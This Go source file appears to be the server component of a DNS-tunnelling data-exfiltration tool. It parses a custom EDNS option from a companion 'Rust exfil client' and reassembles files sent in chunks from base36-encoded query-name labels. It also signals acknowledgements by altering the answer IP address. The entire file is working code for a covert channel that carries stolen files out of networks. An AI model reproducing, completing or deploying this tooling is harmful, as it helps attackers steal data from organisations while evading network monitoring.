package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"strings"
)

type DNSHeader struct {
	ID      uint16
	Flags   uint16
	QDCount uint16
	ANCount uint16
	NSCount uint16
	ARCount uint16
}

type DNSQuestion struct {
	Name  string
	Type  uint16
	Class uint16
}

type DNSResourceRecord struct {
	Name     string
	Type     uint16
	Class    uint16
	TTL      uint32
	RDLength uint16
	RData    []byte
}

// DNSMessage represents a full DNS packet with header and sections.
type DNSMessage struct {
	Header      DNSHeader
	Questions   []DNSQuestion
	Answers     []DNSResourceRecord
	Authorities []DNSResourceRecord
	Additionals []DNSResourceRecord
}

// ExfilMetadata captures the EDNS(0) option payload sent by the Rust exfil client.
type ExfilMetadata struct {
	Version     uint8
	Flags       uint8
	SessionID   uint32
	JobID       uint32
	ChunkIndex  uint32
	TotalChunks uint32
	PayloadLen  uint16
	FileSize    uint64
	Name        string
	Raw         []byte // raw option bytes for debugging or forward compatibility
}

// IsHeader reports whether the metadata represents the header frame.
func (m *ExfilMetadata) IsHeader() bool {
	if m == nil {
		return false
	}
	return (m.Flags & ExfilFlagHeader) != 0
}

// IsFinal reports whether the chunk carries the final payload.
func (m *ExfilMetadata) IsFinal() bool {
	if m == nil {
		return false
	}
	return (m.Flags & ExfilFlagFinalChunk) != 0
}

// extractExfilMetadata scans the additional section for our EDNS option.
func extractExfilMetadata(msg DNSMessage) (*ExfilMetadata, error) {
	for _, rr := range msg.Additionals {
		if rr.Type != 41 { // OPT record
			continue
		}
		meta, err := parseExfilOption(rr.RData)
		if err != nil {
			return nil, err
		}
		if meta != nil {
			return meta, nil
		}
	}
	return nil, nil
}

// parseExfilOption extracts the first matching exfil option from the OPT RDATA.
func parseExfilOption(rdata []byte) (*ExfilMetadata, error) {
	off := 0
	for off+4 <= len(rdata) {
		code := binary.BigEndian.Uint16(rdata[off : off+2])
		length := binary.BigEndian.Uint16(rdata[off+2 : off+4])
		off += 4
		if off+int(length) > len(rdata) {
			return nil, errors.New("edns option truncated")
		}
		if code == ExfilOptionCode {
			payload := rdata[off : off+int(length)]
			meta, err := parseExfilMetadataPayload(payload)
			if err != nil {
				return nil, err
			}
			return meta, nil
		}
		off += int(length)
	}
	return nil, nil
}

func parseExfilMetadataPayload(payload []byte) (*ExfilMetadata, error) {
	const headerLen = 1 + 1 + 4 + 4 + 4 + 4 + 2 + 8 + 1
	if len(payload) < headerLen {
		return nil, fmt.Errorf("exfil option too short: %d", len(payload))
	}
	off := 0
	meta := &ExfilMetadata{Raw: append([]byte(nil), payload...)}
	meta.Version = payload[off]
	off++
	meta.Flags = payload[off]
	off++
	meta.SessionID = binary.LittleEndian.Uint32(payload[off : off+4])
	off += 4
	meta.JobID = binary.LittleEndian.Uint32(payload[off : off+4])
	off += 4
	meta.ChunkIndex = binary.LittleEndian.Uint32(payload[off : off+4])
	off += 4
	meta.TotalChunks = binary.LittleEndian.Uint32(payload[off : off+4])
	off += 4
	meta.PayloadLen = binary.LittleEndian.Uint16(payload[off : off+2])
	off += 2
	meta.FileSize = binary.LittleEndian.Uint64(payload[off : off+8])
	off += 8
	nameLen := int(payload[off])
	off++
	if nameLen > 0 {
		if off+nameLen > len(payload) {
			return nil, errors.New("exfil option name truncated")
		}
		meta.Name = string(payload[off : off+nameLen])
		off += nameLen
	}

	if meta.Version != ExfilProtocolVersion {
		return nil, fmt.Errorf("unsupported exfil protocol version %d", meta.Version)
	}

	return meta, nil
}

// extractExfilPayloadFromQName removes the domain/timestamp labels and returns the base36 blob.
func extractExfilPayloadFromQName(qname string) (string, bool) {
	normalized := strings.TrimSuffix(strings.ToLower(qname), ".")
	parts := strings.Split(normalized, ".")
	if len(parts) < 3 {
		return "", false
	}
	labels := make([]string, len(parts)-2)
	copy(labels, parts[:len(parts)-2])
	if len(labels) == 0 {
		return "", false
	}

	last := labels[len(labels)-1]
	if isLikelyTimestampLabel(last) {
		labels = labels[:len(labels)-1]
	}
	if len(labels) == 0 {
		return "", false
	}

	encoded := strings.Join(labels, "")
	if !looksLikeBase36(encoded) {
		return "", false
	}
	return encoded, true
}

func isLikelyTimestampLabel(label string) bool {
	if len(label) < UnixTimestampMinLength || len(label) > UnixTimestampMaxLength {
		return false
	}
	for _, ch := range label {
		if ch < '0' || ch > '9' {
			return false
		}
	}
	return true
}

// ackIPAddress returns the server IP or +1 (wrap last octet) for ACK signaling.
func ackIPAddress(base string, ack bool) []byte {
	ip, ok := toIPv4(base)
	if !ok || len(ip) != 4 {
		return []byte{127, 0, 0, 1}
	}
	if !ack {
		return ip
	}
	result := append([]byte(nil), ip...)
	result[3] = byte((int(result[3]) + 1) & 0xFF)
	return result
}
